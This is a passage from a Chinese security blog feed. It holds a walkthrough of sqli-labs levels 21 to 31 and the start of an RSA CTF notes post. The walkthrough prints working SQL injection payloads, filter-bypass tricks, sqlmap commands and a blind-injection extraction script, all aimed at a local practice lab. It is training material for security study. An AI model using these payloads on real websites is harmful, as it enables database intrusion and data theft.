title="第十二关"></a>第十二关</h1><p>闭合方式不同，此关是双引号闭合。步骤与十一关相同。<br>先学习到这里，沉淀一下，消化消化新知识。继续加油！</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs靶场攻关（21-31）</title>
      <link href="/posts/1a4cf9ee/"/>
      <url>/posts/1a4cf9ee/</url>
      
        <content type="html"><![CDATA[<h1 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1><h2 id="常规型"><a href="#常规型" class="headerlink" title="常规型"></a>常规型</h2><p>使用admin登录尝试，<br><img src="https://img-blog.csdnimg.cn/2020062821012823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>判断闭合符号<br>使用base64进行了编码，所以payload也使用base64进行一次编码</p><pre class="language-sql" data-language="sql"><code class="language-sql">admin\YWRtaW5c</code></pre><p><img src="https://img-blog.csdnimg.cn/20200628210414565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>所以闭合符号为<code>&#39;)</code><br>然后就可以进行注入了<br>判断列数</p><pre class="language-sql" data-language="sql"><code class="language-sql">admin'<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token comment">#</span>YWRtaW4nKSBvcmRlciBieSAxIw<span class="token operator">=</span><span class="token operator">=</span></code></pre><p>测试到4，报错，列数只有3。跟前面一样<br><img src="https://img-blog.csdnimg.cn/20200628210908983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>联合查询，判断回显点</p><pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/2020062821150715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>回显点找到，爆数据库名</p><pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>JykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw<span class="token operator">=</span><span class="token operator">=</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200628211718216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>接着爆表名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='</span>security'<span class="token comment">#</span>JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknIw<span class="token operator">=</span><span class="token operator">=</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200628212058222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就是爆数据的字段了，然后再爆值就行了，不多说。</p><h2 id="报错型"><a href="#报错型" class="headerlink" title="报错型"></a>报错型</h2><p>判断个数据库名</p><pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token punctuation">)</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span>JykgYW5kICh1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpKSM<span class="token operator">=</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200628213357554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>其他的按照报错注入的流程来进行就可以了。</p><h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1><p>这个与前一关相比就是闭合符号改变了，本关的闭合符号是双引号<code>&quot;</code><br>然后就是重复上面的操作，不再多说。<br>这个也是可以报错注入进行操作的。</p><h1 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h1><h2 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h2><p>这一关是get类型，先判断闭合符号，发现是单引号闭合。<br>这一关是过滤了注释符号，查看源码是可以看出过滤了<code>#</code>和<code>+--</code><br><img src="https://img-blog.csdnimg.cn/20200629211821534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>知识了解<br>注释符的作用：用于标记某段代码的作用，起到对代码功能的说明作用。但是注释掉的内容不会被执行。<br>MySQL中的注释符<br>1.单行注释：<code> --+或--空格 或#</code><br>2.多行注释：<code> /*多行注释内容*/</code><br>去除注释符的代码分析<br><code>preg_replace(mixed $pattern,mixed $replacement,mixed $subject) </code>   执行一个正则表达式的搜索和替换。<br>参数说明：<br>第一个参数：要搜索的模式，可以是字符串或一个字符串数组。<br>第二个参数：用于替换的字符串或字符串数组<br>第三个参数：要搜索替换的目标字符串或字符数组</p><p>那么就想办法绕过，利用注释符过滤不能成功闭合单引号，换一种思路，利用<code>or &#39;1&#39;=&#39;1</code>闭合单引号。于是有下面的payload。</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,'</span><span class="token number">3</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200629213110369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看到成功执行了SQL语句。<br>接下来就是爆数据库</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,database(),'</span><span class="token number">3</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200629214132846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就可以按照常规操作进行注入。</p><h2 id="使用sqlmap进行注入"><a href="#使用sqlmap进行注入" class="headerlink" title="使用sqlmap进行注入"></a>使用sqlmap进行注入</h2><p>使用sqlmap进行探测绕过去注释符的SQL注入攻击</p><pre class="language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">-</span><span class="token operator">-</span>batch</code></pre><p><img src="https://img-blog.csdnimg.cn/20200629213352692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>探测出id位置可能存在注入，并开始注入。时间较长。<br>已经探测出存在有注入了，其实就可以进行下一步了。</p><pre class="language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://127.0.0.1/sqli-labs-master/Less-23/?id=1"</span> <span class="token operator">-</span><span class="token operator">-</span>dbs <span class="token operator">-</span><span class="token operator">-</span>batch</code></pre><p>这个比较快<br><img src="https://img-blog.csdnimg.cn/20200629214739567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后又是傻瓜式操作，为所欲为吧。</p><h1 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h1><p>根据它的提示，知道过滤了and和or。<br>mysql中大小写不敏感，大小写都一样<br>mysql对十六进制和URL编码是会自动解码的。<br>符号和关键字替换 </p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">and</span><span class="token operator">=</span><span class="token operator">=</span><span class="token operator">&amp;&amp;</span>、<span class="token operator">or</span><span class="token operator">=</span><span class="token operator">=</span><span class="token operator">||</span>内联注释：<span class="token comment">/*! 内联注释*/</span>会被当作<span class="token keyword">SQL</span>语句执行多行注释<span class="token comment">/**/</span></code></pre><p>绕过策略：<br>1.大小写变形————————大小写不敏感直接被剔除。<br>2.注释绕过：例如：<code>  a/**/nd </code><br>3.双写绕过   例如：<code>oorr</code><br>4.利用符号替代绕过：如： <code>  and--&amp;&amp;    or---||</code></p><p>判断闭合符号，发现是单引号闭合。<br><img src="https://img-blog.csdnimg.cn/20200629220219794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后判断是否存在注入</p><pre class="language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs-master/Less-25/?id=1' oorr 1=1--+</span>http:<span class="token comment">//127.0.0.1/sqli-labs-master/Less-25/?id=1' Anandd 1=1--+</span></code></pre><p>双写绕过成功，<br><img src="https://img-blog.csdnimg.cn/20200629221256869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><pre class="language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs-master/Less-25/?id=1' || 1=1--+</span></code></pre><p>符号绕过成功。目前的PHP版本可能不支持<code>&amp;&amp;</code>绕过，可以换成其他的版本试试。<br><img src="https://img-blog.csdnimg.cn/20200629221429248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>下面进行sqlmap进行注入<br>数据库名也猜解出来了。<br><img src="https://img-blog.csdnimg.cn/2020062922242877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后进行后续操作就行。</p><h1 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h1><p>在上一关的基础上加了盲注，用脚本就行了，目前脚本正在学习。还是在百度找的大佬的脚本。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/env python</span><span class="token comment">#coding=utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> timechars <span class="token operator">=</span> <span class="token string">r'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz@;\/:.'</span><span class="token comment">#boolean blind sql injection</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1/sqli-labs-master/Less-25a/?id=1 anandd (select substr(&#123;0&#125;,&#123;1&#125;,1))='&#123;2&#125;'"</span>    count <span class="token operator">=</span> <span class="token number">1</span>    result <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result_tmp <span class="token operator">=</span> result        <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span>            <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token string">'\\'</span><span class="token punctuation">:</span>                char <span class="token operator">=</span> <span class="token string">'\\\\'</span>            <span class="token keyword">print</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span>count<span class="token punctuation">,</span>char<span class="token punctuation">)</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span>count<span class="token punctuation">,</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>            soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'lxml'</span><span class="token punctuation">)</span>            font <span class="token operator">=</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'font["size=5"]'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">print</span> font            <span class="token keyword">if</span> <span class="token string">'Your'</span> <span class="token keyword">in</span> font<span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                result<span class="token operator">+=</span>char                <span class="token keyword">print</span> result<span class="token operator">+</span><span class="token string">'......'</span>                <span class="token keyword">break</span>        <span class="token comment">#判断是否结束</span>        <span class="token keyword">if</span> result_tmp <span class="token operator">==</span> result<span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">u'脚本结束(结果不区分大小写)'</span>            <span class="token keyword">print</span> result            <span class="token keyword">break</span>        count <span class="token operator">=</span> count<span class="token operator">+</span><span class="token number">1</span></code></pre><p>还可以使用sqlmap进行探测<br><img src="https://img-blog.csdnimg.cn/20200629233053643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这里也可以看出来是时间盲注。继续探测<br><img src="https://img-blog.csdnimg.cn/20200629233216894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>数据库探测到了，继续操作就行。</p><h1 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h1><p>过滤空格和注释符。<br>空格绕过可以使用以下方法：<br>过滤空格的绕过方式<br>编码：常见的URL编码：%0a换行    %20空格        tab(水平)： %09<br><code>/**/</code><br>就将SQL语句中的空格换成<code>/**/</code>就行了，其他操作与上面一样。</p><h1 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h1><p>同样的套路，仍然是加了盲注，所以使用sqlmap或者脚本都可以做。<br>脚本就不贴了， 自行百度吧，也不能总用别人写的脚本。</p><h1 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h1><p>过滤union和select的关卡，这个绕过方式就是双写，大小写，编码绕过。<br>还有其他的过滤一起加上了<br><img src="https://img-blog.csdnimg.cn/20200629235339206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这里使用大小写加双写绕过，<br>注释符被过滤，所以先对此进行绕过</p><pre class="language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs-master/Less-27/?id=1'||'1'='1</span></code></pre><p>然后爆数据库，这里是对union和select进行过滤，使用双写大小写混合可绕过，不过还有空格的绕过，这里我试了<code>/**/</code>不行，所以就用一下<code>%0A</code>进行绕过。</p><pre class="language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs-master/Less-27/?id=1'%0AuNiunionOn%0AseLeselectct%0A1,2,3||'1'='1</span></code></pre><p>可以发现成功了。<br><img src="https://img-blog.csdnimg.cn/2020063021171623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就可以进行爆数据库名了。</p><pre class="language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs-master/Less-27/?id=999'%0AuNiunionOn%0AseLeselectct%0A1,database(),3||'1'='1</span></code></pre><p>这个无法使用<code>id=-1</code>因为过滤了<code>-</code>所以就用个比较大的数1000、999之类的数字都行。<br><img src="https://img-blog.csdnimg.cn/20200630212205816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>就是这样，剩下的就是为所欲为了。</p><h1 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h1><p>这一关与27关不同的只是闭合符号不一样，本关是双引号闭合</p><pre class="language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs-master/Less-27a/?id=1" or "1"="1</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200630220743196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>剩下的就跟27关一样了，老套路往上套就行了。</p><h1 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h1><p>这个判断闭合符号没有判断出来，于是看下源代码，<br><img src="https://img-blog.csdnimg.cn/20200630222743753.png" alt="m0re" loading="lazy"><br>看到了是<code>&#39;)</code>闭合，突然想到一个办法，就是暴力猜解<br>使用一个常见的闭合符号做的字典，然后使用burp进行暴力破解<br>果然可以，得到了几个，范围小很多了。<br><img src="https://img-blog.csdnimg.cn/20200630224700175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><pre class="language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs-master/Less-28/?id=999')%0AUnIunion%0Aselecton%0AsElEct%0A1,database(),3||('1')=('1</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200630222842173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>奥，好吧，这个原来是要一个一个尝试的，根据回显正确还是错误来判断。emmm，我用sqlmap跑一下试试。</p><p>eeeee，就是太慢了，闭合符号能判断出来就行。<br>对了，再说一下这个payload。<br>%0A绕过空格就不用细说了。主要是这个<code>union select</code>,需要先构造一个<code>union select</code>给它过滤，这里用到双写。而且<code>union select</code>必须要连在一起才行。后面用<code>or&#39;1&#39;=&#39;1</code>形式来绕过注释符。</p><h1 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h1><p> 这个跟28一样，闭合符号都没有变，而且这一关没有过滤空格<br> <img src="https://img-blog.csdnimg.cn/20200630225853867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br> 所以只需要进行注释绕过和<code>union select</code>绕过即可。</p><h1 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h1><p>eee,原本没看懂什么意思，这个是直接可以注入的，</p><p><img src="https://img-blog.csdnimg.cn/20200630231040765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>直接得到数据库名了。<br>而且我用sqlmap跑了一遍，也没有问题。<br><img src="https://img-blog.csdnimg.cn/20200630230857312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>所以我有点迷，这一关是要干什么？<br>然后查了一下网上大师傅的博客，看到好多个不同的，然后找到一个比较好的博客，这里先贴出来🔑<a href="https://www.jianshu.com/p/46cb6c354de5">sql-labs/Less-29</a><br>这位师傅的博客写的非常详细，学习了。<br>就是问题是<br><img src="https://img-blog.csdnimg.cn/2020071214593214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>我的为什么没有跳转到<code>hacked.jsp</code><br>可能是我的靶场哪里出了问题。不过还是了解了tomcat服务器，还有注入时遇到双服务器。</p><h1 id="Less-30-31"><a href="#Less-30-31" class="headerlink" title="Less-30-31"></a>Less-30-31</h1><p>然后的话，30和31和这一关没什么太大区别，都是老套路。就不总结了。</p><p>下周继续努力。</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA密码的学习及常见CTF题型总结</title>
      <link href="/posts/25ed446b/"/>
      <url>/posts/25ed446b/</url>
      
        <content type="html"><![CDATA[<h1 id="放在最前面"><a href="#放在最前面" class="headerlink" title="放在最前面"></a>放在最前面</h1><p> 大师傅博客<br><a href="https://www.freebuf.com/column/148185.html">从数盲到口算 ——带你玩转RSA加密算法（一）</a><br><a href="https://www.freebuf.com/column/148898.html">你想要的RSA解题技巧（二）</a><br>前言：gmpy2库终于安装好了，那就能开心的玩耍了。<br>一个平台一个平台的“扫荡”<br>RSA这类题真是每次看见都着急，学脚本吧？但是又没有gmpy2。无奈，现在终于有了，我要把之前每写出来的题扫一遍。<br>关于RSA的这个密码。数学逻辑比较……那啥一点，跟着B站上的一个up主学的，讲的挺好，听着听着睡着了。让我找到了高中的感觉。跑题了，，咳咳。当然还有师傅们的博客提供学习帮助。</p><h1 id="RSA密码原理"><a href="#RSA密码原理" class="headerlink" title="RSA密码原理"></a>RSA密码原理</h1><p><img src="https://img-blog.csdnimg.cn/20200421180651267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自漏斗社区" loading="lazy"><br>数学知识：<br>首先：取模运算知识，就是取余数。可以使用python的pow函数来解<br>pow的解法如下：</p><p><img src="https://img-blog.csdnimg.cn/20200422160841868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>其次：同余运算。两个整数a,b，它们除以整数M所得的余数相等：a ≡ b(mod m)，比如说5除3余数为2，11除3余数也为2，于是可写成11 ≡ 5(mod 3)。<br>RSA加密算法：<br>一个原理图，从漏斗社区借鉴的<br><img src="https://img-blog.csdnimg.cn/20200422163149234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自漏斗社区" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200422163252185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自漏斗社区" loading="lazy"><br>这两张图对于理解rsa加密很有帮助，我从这两张图中理解后思路变的更清晰了。<br>还有一张解析CTF中的rsa基础题型的图。声明：是漏斗社区的师傅写的，我只是搬过来做个笔记，方便以后查询使用。<br><img src="https://img-blog.csdnimg.cn/2020042216384716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自漏斗社区" loading="lazy"><br>做几个类型的题目记录一下，防止以后忘记方便复习。</p><h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p><img src="https://img-blog.csdnimg.cn/20200402213426241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这道题是一种类型，已知p,q,e，求d<br>可以用求d的脚本直接解出，运行脚本需要用到gmpy2第三方库。<br>直接上脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!------Augenstern------!</span><span class="token comment">#!lalalalalala------lalalalalalalalala!</span><span class="token comment">#!***********lxj python***********!</span><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> numberp <span class="token operator">=</span> <span class="token number">473398607161</span>q <span class="token operator">=</span> <span class="token number">4511491</span>e <span class="token operator">=</span> <span class="token number">17</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span></code></pre><p>flag{125631357777427553}</p><h2 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h2><p><img src="https://img-blog.csdnimg.cn/20200414225459263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>脚本关。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">def</span> <span class="token function">Decrypt</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>e<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>L<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>L<span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qm<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>p <span class="token operator">=</span>  <span class="token number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span>q <span class="token operator">=</span>  <span class="token number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span>e <span class="token operator">=</span>  <span class="token number">65537</span>c <span class="token operator">=</span>  <span class="token number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span>Decrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span>e<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span></code></pre><p>注释：<br><code>__name__==&#39;__main__&#39;</code>一个python文件通常有两种使用方法，<br>第一是作为脚本直接执行，<br>第二是 import 到其他的 python 脚本中被调用（模块重用）执行。因此 <code>if __name__ == &#39;main&#39;:</code> 的作用就是控制这两种情况执行代码的过程，在 <code>if __name__ == &#39;main&#39;:</code> 下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而 import 到其他脚本中是不会被执行的，忘了就再看看大佬的博客<a href="https://blog.csdn.net/heqiang525/article/details/89879056">大佬博客</a><br>flag其他没什么了。flag直接得到。</p><h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><p><img 